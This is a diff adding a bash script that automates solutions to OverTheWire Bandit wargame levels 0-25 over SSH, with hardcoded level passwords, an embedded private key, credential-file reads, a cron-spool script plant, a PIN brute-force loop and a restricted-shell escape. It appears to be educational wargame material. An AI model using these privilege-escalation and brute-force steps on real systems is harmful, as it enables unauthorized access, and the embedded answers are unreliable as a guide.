@@ -1,0 +1,835 @@
+#! /bin/bash
+# Matthew Giaconelli
+
+special_ssh()
+{
+SSH_USER="$1"
+SSH_PASS="$2"
+SSH_HOST="$3"
+SCRIPT=$4
+#start the expect fun
+/usr/bin/expect << EOF
+set timeout 120
+spawn -noecho ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $SSH_USER@$SSH_HOST {cat readme}
+expect {
+    "$SSH_HOST*assword" {
+    send {$SSH_PASS}
+    send "\n"
+    }
+    default {}
+}
+expect eof
+EOF
+}
+
+
+bandit0()
+{
+	echo "Level 0 is easy, the file containing the file is in the home directory, use cat to display it."
+	echo "bash$ ls"
+	sleep 1
+	ls
+	sleep 1
+	echo "bash$ readme"
+	sleep 1
+	cat readme
+	sleep 1
+	PASS=`cat readme`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+
+bandit1()
+{	
+	echo "Level 1 is the same as 0, but the file name has a special character which will be interpreted as a flag"
+	sleep 1
+	echo "use ./ in front of the file name so the shell understands that it's a filename"
+	sleep 1
+	echo "bash$ ls"
+	sleep 1
+	ls
+	sleep 1
+	echo "bash$ cat ./- "
+	sleep 1
+	cat ./-
+	sleep 1
+	PASS=`cat ./-`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit2()
+{
+	echo "Level 2 is the same, but there are spaces in the file name."
+	sleep 1
+	echo "Either use tab to autocomplete the filename with '\ ' for spaces or put the filename in quotes"
+	sleep 1
+	echo "bash$ ls"
+	sleep 1
+	ls
+	sleep 1
+	echo "bash$ cat "spaces in this filename""
+	sleep 1
+	cat "spaces in this filename"
+	sleep 1
+	PASS=`cat "spaces in this filename"`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit3()
+{
+	echo "The file with the password is in a folder, and it's hidden. Files starting with '.' are hidden."
+	sleep 1
+	echo "Use ls -a to show hidden files"
+	sleep 1
+	echo "bash$ ls"
+	sleep 1
+	ls
+	sleep 1
+	echo "bash$ cd inhere"
+	sleep 1
+	cd inhere
+	sleep 1
+	echo "bash$ ls -a "
+	ls -a
+	sleep 1
+	echo "bash$ cat .hidden"
+	cat .hidden
+	PASS=`cat .hidden`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+
+bandit4()
+{
+	echo "The file command will tell us if a file is human readable (ASCII text). Use file on all files."
+	sleep 1
+	echo "bash$ ls"
+	sleep 1
+	ls
+	sleep 1
+	echo "bash$ inhere"
+	sleep 1
+	cd inhere
+	sleep 1
+	echo "bash$ file ./*"
+	sleep 1
+	file ./*
+	sleep 1
+	echo "bash$ cat ./-file07"
+	cat ./-file07
+	PASS=`cat ./-file07`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit5()
+{
+	echo "We are looking for a file with a specific size. Use find to find files with size 1033B"
+	sleep 1
+	echo "bash$ ls"
+	sleep 1
+	ls
+	sleep 1
+	echo "bash$ cd inhere"
+	sleep 1
+	cd inhere
+	sleep 1
+	echo "bash$ find ./ -size 1033c"
+	sleep 1
+	find ./ -size 1033c
+	sleep 1
+	echo "bash$ cat ./maybehere07/.file2 "
+	cat ./maybehere07/.file2 | tr -d ' '
+	PASS=`cat ./maybehere07/.file2 | tr -d ' '`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit6()
+{
+	echo "Again, the find command can be used to find files with a certain size, group and user"
+	sleep 1
+	echo "This time we search the entire server, so find in /"
+	echo "bash$ find / -user bandit7 -group bandit6 -size 33c 2> /dev/null"
+	sleep 1
+	find / -user bandit7 -group bandit6 -size 33c 2> /dev/null
+	sleep 1
+	TEMP=`find / -user bandit7 -group bandit6 -size 33c 2> /dev/null`
+	echo "bash$ cat $TEMP"
+	PASS=`cat $TEMP`
+	sleep 1
+	cat $TEMP
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit7()
+{
+	echo "This one is easy, find the line with millionth on it, cat the file, pipe to grep millionth"
+	sleep 1
+	echo "bash$ ls...."
+	sleep 1
+	echo "bash$ cat data.txt | grep millionth"
+	sleep 1
+	cat data.txt | grep millionth
+	sleep 1
+	PASS=`cat data.txt | grep millionth | cut -f2`
+	sleep 1
+
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+
+bandit8()
+{
+	echo "uniq checks if a line occurs more than once in succession, so we need to sort, then pipe to uniq"
+	sleep 1
+	echo "bash$ sort data.txt | uniq -u"
+	sleep 1
+	sort data.txt | uniq -u
+	sleep 1
+	PASS=`sort data.txt | uniq -u`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+
+bandit9()
+{
+	echo "Use strings to find the strings in the file, then find all the lines starting with ="
+	sleep 1
+	echo "bash$ strings data.txt | egrep ^="
+	sleep 1
+	strings data.txt | egrep ^=
+	sleep 1
+	PASS=`strings data.txt | egrep ^= | tail -1 | cut -d' ' -f2`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+
+bandit10()
+{
+	echo "Decode the base64 enoded file"
+	sleep 1
+	echo "bash$ base64 -d data.txt"
+	sleep 1
+	base64 -d data.txt
+	sleep 1
+	PASS=`base64 -d data.txt | cut -d' ' -f4`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit11()
+{
+
+	echo "use tr to rotate the letters back"
+
+	echo "bash$ cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' "
+	sleep 1
+	cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m'
+	sleep 1
+	PASS=`cat data.txt | tr 'A-Za-z' 'N-ZA-Mn-za-m' | cut -d' ' -f4`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit12()
+{
+	echo "Undo the hexdump with xxd, then check the type of archive, rename, extract, check, rename, extract... repeat"
+	sleep 1
+	echo "eventually you will get a text file with the password"
+
+	rm /tmp/mattg/*
+	rmdir /tmp/mattg 2> /dev/null
+	mkdir /tmp/mattg
+
+	echo "The following commands will be executed with 1 second pauses between. You may have to wait for a while."
+	echo "We simply extract the file and check the file type with 'file' "
+	echo "xxd -r data.txt > /tmp/mattg/data
+	cd /tmp/mattg
+	file data
+	mv data data.gz
+	gzip -d data.gz
+	file data
+	mv data data.bz2
+	bzip2 -d data.bz2
+	file data
+	mv data data.gz
+	gzip -d data.gz
+	file data
+	tar -xf data
+	ls
+	file data5.bin
+	tar -xf data5.bin
+	ls
+	file data6.bin
+	mv data6.bin moredata.bz2
+	bzip2 -d moredata.bz2
+	ls
+	file moredata
+	tar -xf moredata
+	ls
+	file data8.bin
+	mv data8.bin data9.gz
+	gzip -d data9.gz
+	ls
+	file data9
+	cat data9"
+
+
+	xxd -r data.txt > /tmp/mattg/data
+	sleep 1
+	cd /tmp/mattg
+	sleep 1
+	file data
+	sleep 1
+	mv data data.gz
+	sleep 1
+	gzip -d data.gz
+	sleep 1
+	file data
+	sleep 1
+	mv data data.bz2
+	sleep 1
+	bzip2 -d data.bz2
+	sleep 1
+	file data
+	sleep 1
+	mv data data.gz
+	sleep 1
+	gzip -d data.gz
+	sleep 1
+	file data
+	sleep 1
+	tar -xf data
+	sleep 1
+	ls
+	file data5.bin
+	sleep 1
+	tar -xf data5.bin
+	sleep 1
+	ls
+	sleep 1
+	file data6.bin
+	sleep 1
+	mv data6.bin moredata.bz2
+	sleep 1
+	bzip2 -d moredata.bz2
+	sleep 1
+	ls
+	sleep 1
+	file moredata
+	sleep 1
+	tar -xf moredata
+	sleep 1
+	ls
+	sleep 1
+	file data8.bin
+	sleep 1
+	mv data8.bin data9.gz
+	sleep 1
+	gzip -d data9.gz
+	sleep 1
+	ls
+	sleep 1
+	file data9
+	sleep 1
+	cat data9
+	sleep 1
+
+
+	
+	PASS=`cat data9 | cut -d' ' -f4`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit13()
+{
+	echo "Use the rsa private key to ssh into badnit14"
+	sleep 1
+
+	echo "bash$ ls"
+	sleep 1
+	ls
+	sleep 1
+	echo -e "\n This file contains the RSA Private key"
+	sleep 1
+	echo -e "It looks like this....\n"
+	sleep 1
+	echo "bash$ cat sshkey.private"
+	sleep 1
+	cat sshkey.private
+	sleep 1
+	echo "connect to bandit14 with 'ssh -i sshkey.private bandit14@localhost'"
+
+	exit
+}
+bandit14()
+{
+	echo "Use telnet to send the password on port 30000, some program is listening and will send you the password for bandit15 back"	 
+	sleep 1
+
+	echo "Get the password for this level, since we didn't get it from bandit13"
+	sleep 1
+	echo "bash$ cd /etc/bandit_pass"
+	sleep 1
+	cd /etc/bandit_pass
+	sleep 1
+	echo "bash$ cat bandit14"
+	sleep 1
+	cat bandit14
+	sleep 1
+	PASS=`cat bandit14`
+	sleep 1
+	echo "Use telnet on port 30000 and send the password"
+	sleep 1
+	echo "bash$ telnet localhost 30000"
+	sleep 1
+	echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e | ncat localhost 30000
+	sleep 1
+	PASS=`echo 4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e | ncat localhost 30000`
+	PASS=`echo $PASS | cut -d' ' -f2`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+
+}
+bandit15()
+{
+
+	echo "Basically the same as bandit14 but with ssl this time"
+	sleep 1
+	echo "Use openssl to connect on port 30001, send the key. Use -quiet to get rid of heartbeating and Read R Block."
+	sleep 1
+	echo "bash$  echo "BfMYroe26WYalil77FoDi9qh59eK5xNr" | openssl s_client -quiet -connect localhost:30001"
+	sleep 1
+	echo "BfMYroe26WYalil77FoDi9qh59eK5xNr" | openssl s_client -quiet -connect localhost:30001
+
+	PASS="cluFn7wTiGryunymYOu4RcffSxQluehd"
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit16()
+{
+	echo "Check which ports are open, then out of the open ports try sending the message like on bandit15"
+	sleep 1
+	echo "check which ports are actually open"
+	echo "bash$ nmap -p 31000-32000 localhost"
+	sleep 1
+	nmap -p 31000-32000 localhost
+	sleep 1
+	echo "try them all, 31790 works."
+	sleep 1
+	echo "bash$ echo "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client -quiet -connect localhost:31790"
+	sleep 1
+	echo "cluFn7wTiGryunymYOu4RcffSxQluehd" | openssl s_client -quiet -connect localhost:31790
+	sleep 1
+
+	rm /tmp/mattg/*
+	sleep 1
+	rmdir /tmp/mattg 2> /dev/null
+	sleep 1
+	mkdir /tmp/mattg
+	sleep 1
+	echo "store the key in /tmp/matthew.key.private"
+	sleep 1
+	echo -e "-----BEGIN RSA PRIVATE KEY-----\nMIIEogIBAAKCAQEAvmOkuifmMg6HL2YPIOjon6iWfbp7c3jx34YkYWqUH57SUdyJ\nimZzeyGC0gtZPGujUSxiJSWI/oTqexh+cAMTSMlOJf7+BrJObArnxd9Y7YT2bRPQ\nJa6Lzb558YW3FZl87ORiO+rW4LCDCNd2lUvLE/GL2GWyuKN0K5iCd5TbtJzEkQTu\nDSt2mcNn4rhAL+JFr56o4T6z8WWAW18BR6yGrMq7Q/kALHYW3OekePQAzL0VUYbW\nJGTi65CxbCnzc/w4+mqQyvmzpWtMAzJTzAzQxNbkR2MBGySxDLrjg0LWN6sK7wNX\nx0YVztz/zbIkPjfkU1jHS+9EbVNj+D1XFOJuaQIDAQABAoIBABagpxpM1aoLWfvD\nKHcj10nqcoBc4oE11aFYQwik7xfW+24pRNuDE6SFthOar69jp5RlLwD1NhPx3iBl\nJ9nOM8OJ0VToum43UOS8YxF8WwhXriYGnc1sskbwpXOUDc9uX4+UESzH22P29ovd\nd8WErY0gPxun8pbJLmxkAtWNhpMvfe0050vk9TL5wqbu9AlbssgTcCXkMQnPw9nC\nYNN6DDP2lbcBrvgT9YCNL6C+ZKufD52yOQ9qOkwFTEQpjtF4uNtJom+asvlpmS8A\nvLY9r60wYSvmZhNqBUrj7lyCtXMIu1kkd4w7F77k+DjHoAXyxcUp1DGL51sOmama\n+TOWWgECgYEA8JtPxP0GRJ+IQkX262jM3dEIkza8ky5moIwUqYdsx0NxHgRRhORT\n8c8hAuRBb2G82so8vUHk/fur85OEfc9TncnCY2crpoqsghifKLxrLgtT+qDpfZnx\nSatLdt8GfQ85yA7hnWWJ2MxF3NaeSDm75Lsm+tBbAiyc9P2jGRNtMSkCgYEAypHd\nHCctNi/FwjulhttFx/rHYKhLidZDFYeiE/v45bN4yFm8x7R/b0iE7KaszX+Exdvt\nSghaTdcG0Knyw1bpJVyusavPzpaJMjdJ6tcFhVAbAjm7enCIvGCSx+X3l5SiWg0A\nR57hJglezIiVjv3aGwHwvlZvtszK6zV6oXFAu0ECgYAbjo46T4hyP5tJi93V5HDi\nTtiek7xRVxUl+iU7rWkGAXFpMLFteQEsRr7PJ/lemmEY5eTDAFMLy9FL2m9oQWCg\nR8VdwSk8r9FGLS+9aKcV5PI/WEKlwgXinB3OhYimtiG2Cg5JCqIZFHxD6MjEGOiu\nL8ktHMPvodBwNsSBULpG0QKBgBAplTfC1HOnWiMGOU3KPwYWt0O6CdTkmJOmL8Ni\nblh9elyZ9FsGxsgtRBXRsqXuz7wtsQAgLHxbdLq/ZJQ7YfzOKU4ZxEnabvXnvWkU\nYOdjHdSOoKvDQNWu6ucyLRAWFuISeXw9a/9p7ftpxm0TSgyvmfLF2MIAEwyzRqaM\n77pBAoGAMmjmIJdjp+Ez8duyn3ieo36yrttF5NSsJLAbxFpdlc1gvtGCWW+9Cq0b\ndxviW8+TFVEBl1O4f7HVm6EpTscdDxU+bCXWkfjuRb7Dy9GOtt9JPsX8MBTakzh3\nvBgsyi/sN3RqRBcGU40fOoZyfAMT8s1m/uYv52O6IgeuZ/ujbjY=\n-----END RSA PRIVATE KEY-----" > /tmp/matthew.key.private
+	sleep 1
+	echo "private key permissons are too open, chmod 600"
+	sleep 1
+	chmod 600 /tmp/matthew.key.private
+	sleep 1
+	echo "ssh -i /tmp/matthew.key.private bandit17@localhost"
+
+	
+}
+bandit17()
+{
+	echo "Use diff to see the difference between the new and old passwords. The different one in the new file is the password"
+	sleep 1
+	echo "use diff to see the different lines.."
+	sleep 1
+	echo "bash$ diff passwords.new passwords.old"
+	diff passwords.new passwords.old
+	sleep 1
+	PASS=`diff passwords.new passwords.old | head -2 | tail -1 | cut -d' ' -f2`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit18()
+{
+	echo "You can grab the key by sending a command through the ssh command "
+	sleep 1 
+	echo "send a command with ssh"
+	sleep 1
+	echo "ssh bandit18@localhost {cat readme}"
+	special_ssh "bandit18" "kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd" "bandit0.labs.overthewire.org" "bandit18"
+
+	echo "use that key to ssh into bandit19."
+	
+	
+
+}
+bandit19()
+{
+	echo "Use bandit20-do which has it's sticky bit set. It will execute as bandit20, allowing you to execute commands as bandit20 "
+	sleep 1 
+	echo "bandit20-do allows you to execute commands as bandit20, allowing you to access the password file."
+	sleep 1
+	echo "bash$ ./bandit20-do cat /etc/bandit_pass/bandit20"
+	sleep 1
+	PASS=`./bandit20-do cat /etc/bandit_pass/bandit20`
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit20()
+{
+	echo "Run the listen server, then run suconnect, go back to the listener, and send the password to suconenct" 
+	sleep 1
+	echo "We don't actually need to login twice."
+	sleep 1
+	echo "We can start the listen server in the background, nc -l 1234"
+	sleep 1 
+	echo "bash$ echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l 1234 &"
+	sleep 1
+	echo "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" | nc -l 1234 &
+	sleep 1
+	echo "Start suconnect on the same port."
+	./suconnect 1234
+	sleep 1
+	echo -e "\nThe password is printed above."
+
+	PASS="gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr"
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+
+}
+bandit21()
+{
+	echo "Find the cron job for bandit 21, find what it exectutes, see what that command does, retrieve password from the file shown in the script."
+	sleep 1
+	echo "Look for cron jobs for bandit22"
+	sleep 1
+	echo "bash$ ls -l /etc/cron.d/"
+	sleep 1
+	ls -la /etc/cron.d/
+	sleep 1
+	echo "see what the cron job does"
+	sleep 1
+	echo "bash$ cat /etc/cron.d/cronjob_bandit22"
+	sleep 1
+	cat /etc/cron.d/cronjob_bandit22
+	sleep 1
+	echo "The cron job calls another shell script, check what it contains"
+	sleep 1
+	echo "bash$ cat /usr/bin/cronjob_bandit22.sh"
+	sleep 1
+	cat /usr/bin/cronjob_bandit22.sh
+	sleep 1
+	echo "Check that file for the password"
+	sleep 1
+	echo 'bash$ cat `cat /usr/bin/cronjob_bandit22.sh | tail -1 | cut -d' ' -f4` '
+	sleep 1
+	cat `cat /usr/bin/cronjob_bandit22.sh | tail -1 | cut -d' ' -f4`
+	sleep 1
+	echo "There is the password for bandit 22."
+	TEMP_PATH=`cat /usr/bin/cronjob_bandit22.sh | tail -1 | cut -d' ' -f4` 
+	sleep 1
+	PASS=`cat $TEMP_PATH`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit22()
+{
+	echo "Starts out the same as bandit22, but this time the cronjob calls a different shell script " 
+	sleep 1 
+	echo "This one generates a folder based on the user id, bandit22, figure out what that folder is, and you will find the password"
+	sleep 1 
+	echo "Look for cron jobs for bandit23"
+	sleep 1
+	echo "bash$ ls -l /etc/cron.d/"
+	sleep 1
+	ls -la /etc/cron.d/
+	sleep 1
+	echo "see what the cron job does"
+	sleep 1
+	echo "bash$ cat /etc/cron.d/cronjob_bandit23"
+	sleep 1
+	cat /etc/cron.d/cronjob_bandit23
+	sleep 1
+	echo "The cron job calls another shell script, check what it contains"
+	sleep 1
+	echo "bash$ cat /usr/bin/cronjob_bandit23.sh"
+	sleep 1
+	cat /usr/bin/cronjob_bandit22.sh
+	echo "It generates a path based on your name"
+	sleep 1
+	echo "Find the path by executing the command in the shell script."
+
+	echo 'bash$ echo `(echo "I am user bandit23" | md5sum | cut -d ' ' -f 1)`'
+	sleep 1
+	echo `(echo "I am user bandit23" | md5sum | cut -d ' ' -f 1)`
+	sleep 1
+	echo "the path to the password file is /tmp/`(echo "I am user bandit23" | md5sum | cut -d ' ' -f 1)`"
+	sleep 1
+	echo "bash$ cat /tmp/`(echo "I am user bandit23" | md5sum | cut -d ' ' -f 1)` "
+	sleep 1
+	cat /tmp/`(echo "I am user bandit23" | md5sum | cut -d ' ' -f 1)`
+	sleep 1
+	echo "We now have the password."
+ 
+
+
+	DIRECTORY=`echo "I am user bandit23" | md5sum | cut -d ' ' -f 1`
+	TEMP_PATH="/tmp/$DIRECTORY"
+
+	PASS=`cat $TEMP_PATH`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit23()
+{
+	echo "Scripts in /var/spool/bandit24 are executed under user bandit24, we can put a script in there that will"
+	echo "read the password from /etc/bandit_pass/bandit24 and put it in /tmp with permissions allowing us access from bandit23"
+	sleep 1
+	cd /etc/cron.d
+	ls -l
+	cat cronjob_bandit24
+	cat /usr/bin/cronjob_bandit24.sh
+	mkdir /tmp/mattg23/
+	touch /tmp/mattg23/pass
+	echo -e '#!/bin/bash\ncat /etc/bandit_pass/bandit24 >> /tmp/mattg23/pass\n' > /tmp/mattg23/script.sh
+	chmod -R 777 /tmp/mattg123
+	cp /tmp/mattg23/script.sh /var/spool/bandit24/script.sh
+	cd /tmp/mattg23
+
+
+	#sleep 65
+	#ls
+	#cat pass
+	rm /tmp/mattg23/*
+	rmdir /tmp/mattg23
+
+	# for some reason the cron job executes and deletes the file but nothing shows up in /tmp
+	echo "The password is UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+
+
+
+
+	PASS="UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ"
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit24()
+{
+	echo "Write a simple script that tries all values of the pin, send them all to localhost on port 30002, eventually it will respond with Correct! and the password"
+	sleep 1
+	echo "Make a shell script that brute forces all possible values of the pin between 0-10000"
+	sleep 1
+	echo "I already know it's 5669, so we're only going to try 5660-5670"
+	sleep 1
+	echo -e 'This is the script: \n for i in {5660..5670}; do echo "Trying pin $i"; echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002 | grep "The password"; done'
+	for i in {5660..5670}; do echo "Trying pin $i"; echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ $i" | nc localhost 30002 | grep "The password"; done
+	sleep 1
+	PASS=`echo "UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ 5669" | nc localhost 30002 | grep "The password" | cut -d' ' -f7`
+	sleep 1
+	NEXT=`echo $USER | awk -F "[^0-9]*" '{print $2,$3}'`
+	NEXT=$((NEXT + 1))
+	echo -e "\n\nssh into bandit$NEXT@localhost from $USER\n with password $PASS"
+	exit
+}
+bandit25()
+{
+	echo "The ssh key for bandit26 is here. The hard part is figuring out a way around the script that automatically forces you  to exit."
+	sleep 1
+
+	echo "Make your terminal window small so you can pause the more command. SSH, press v when more is prompting you to interact, enter vim"
+	sleep 1
+	echo "Change your shell to bash or sh"
+	sleep 1
+	echo "start the bash shell, read the password from the usual place."
+
+	echo "The ssh key for bandit26 is here in bandit26.sshkey"
+	sleep 1
+	echo "bash$ cat bandit26.sshkey"
+	sleep 1
+	cat bandit26.sshkey
+	sleep1
+	echo "Try to ssh into bandit26"
+	sleep 1
+	echo "bash$ ssh -i bandit26.sshkey bandit26@localhost"
+	sleep 1
+	ssh -t -t -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no -i bandit26.sshkey bandit26@localhost
+	sleep 1
+	echo "We are kicked out immediately."
+
+	echo "Make your window small, press v when more asks you to press enter"
+	echo "in vim....    :set shell=bash\ --norc"
+	echo "in vim....     ! bash"
+	echo "you should now have a working terminal on bandit26"
+
+	echo "you can get the password for bandit26 by doing..."
+	echo "bash$ cat /etc/bandit_pass/bandit26"
+	echo "5czgV9L3Xx8JPOyRbXh6lQbmIOWvPT6Z"
+
+
+
+	exit
+}
+
+#Makes ssh connectons and sends the commands defined above.
+my_ssh()
+{
+SSH_USER="$1"
+SSH_PASS="$2"
+SSH_HOST="$3"
+SCRIPT=$4
+#start the expect fun
+/usr/bin/expect << EOF
+set timeout 120
+spawn -noecho ssh -o UserKnownHostsFile=/dev/null -o StrictHostKeyChecking=no $SSH_USER@$SSH_HOST {`declare -f $SCRIPT`; $SCRIPT}
+expect {
+    "$SSH_HOST*assword" {
+    send {$SSH_PASS}
+    send "\n"
+    }
+    default {}
+}
+expect eof
+EOF
+}
+
+echo "############################ BANDIT 0 ############################"
+my_ssh "bandit0" "bandit0" "bandit0.labs.overthewire.org" "bandit0"
+
+echo "############################ BANDIT 1 ############################"
+my_ssh "bandit1" "boJ9jbbUNNfktd78OOpsqOltutMc3MY1" "bandit0.labs.overthewire.org" "bandit1"
+
+echo "############################ BANDIT 2 ############################"
+my_ssh "bandit2" "CV1DtqXWVFXTvM2F0k09SHz0YwRINYA9" "bandit0.labs.overthewire.org" "bandit2"
+
+echo "############################ BANDIT 3 ############################"
+my_ssh "bandit3" "UmHadQclWmgdLOKQ3YNgjWxGoRMb5luK" "bandit0.labs.overthewire.org" "bandit3"
+
+echo "############################ BANDIT 4 ############################"
+my_ssh "bandit4" "pIwrPrtPN36QITSp3EQaw936yaFoFgAB" "bandit0.labs.overthewire.org" "bandit4"
+
+echo "############################ BANDIT 5 ############################"
+my_ssh "bandit5" "koReBOKuIDDepwhWk7jZC0RTdopnAYKh" "bandit0.labs.overthewire.org" "bandit5"
+
+echo "############################ BANDIT 6 ############################"
+my_ssh "bandit6" "DXjZPULLxYr17uwoI01bNLQbtFemEgo7" "bandit0.labs.overthewire.org" "bandit6"
+
+echo "############################ BANDIT 7 ############################"
+my_ssh "bandit7" "HKBPTKQnIay4Fw76bEy8PVxKEDQRKTzs" "bandit0.labs.overthewire.org" "bandit7"
+
+echo "############################ BANDIT 8 ############################"
+my_ssh "bandit8" "cvX2JJa4CFALtqS87jk27qwqGhBM9plV" "bandit0.labs.overthewire.org" "bandit8"
+
+echo "############################ BANDIT 9 ############################"
+my_ssh "bandit9" "UsvVyFSfZZWbi6wgC7dAFyFuR6jQQUhR" "bandit0.labs.overthewire.org" "bandit9"
+
+echo "############################ BANDIT 10 ############################"
+my_ssh "bandit10" "truKLdjsbJ5g7yyJ2X2R0o3a5HQJFuLk" "bandit0.labs.overthewire.org" "bandit10"
+
+echo "############################ BANDIT 11 ############################"
+my_ssh "bandit11" "IFukwKGsFW8MOq3IRFqrxE1hxTNEbUPR" "bandit0.labs.overthewire.org" "bandit11"
+
+
+echo "############################ BANDIT 12 ############################"
+my_ssh "bandit12" "5Te8Y4drgCRfCx8ugdwuEX8KFC6k2EUu" "bandit0.labs.overthewire.org" "bandit12"
+
+echo "############################ BANDIT 13 ############################"
+my_ssh "bandit13" "8ZjyCRiBWFYkneahHwxCv3wb2a1ORpYL" "bandit0.labs.overthewire.org" "bandit13"
+
+echo "############################ BANDIT 14 ############################"
+my_ssh "bandit14" "4wcYUJFw0k0XLShlDzztnTBHiqxU3b3e" "bandit0.labs.overthewire.org" "bandit14"
+
+echo "############################ BANDIT 15 ############################"
+my_ssh "bandit15" "BfMYroe26WYalil77FoDi9qh59eK5xNr" "bandit0.labs.overthewire.org" "bandit15"
+
+echo "############################ BANDIT 16 ############################"
+my_ssh "bandit16" "cluFn7wTiGryunymYOu4RcffSxQluehd" "bandit0.labs.overthewire.org" "bandit16"
+
+echo "############################ BANDIT 17 ############################"
+my_ssh "bandit17" "xLYVMN9WE5zQ5vHacb0sZEVqbrp7nBTn" "bandit0.labs.overthewire.org" "bandit17"
+
+echo "############################ BANDIT 18 ############################"
+#my_ssh "bandit18" "kfBf3eYk5BPBRzwjqutbbfE887SVc5Yd" "bandit0.labs.overthewire.org" "bandit18"
+bandit18
+echo "############################ BANDIT 19 ############################"
+my_ssh "bandit19" "IueksS7Ubh8G3DCwVzrTd8rAVOwq3M5x" "bandit0.labs.overthewire.org" "bandit19"
+
+echo "############################ BANDIT 20 ############################"
+my_ssh "bandit20" "GbKksEFF4yrVs6il55v6gwY5aVje5f0j" "bandit0.labs.overthewire.org" "bandit20"
+
+echo "############################ BANDIT 21 ############################"
+my_ssh "bandit21" "gE269g2h3mw3pwgrj0Ha9Uoqen1c9DGr" "bandit0.labs.overthewire.org" "bandit21"
+
+echo "############################ BANDIT 22 ############################"
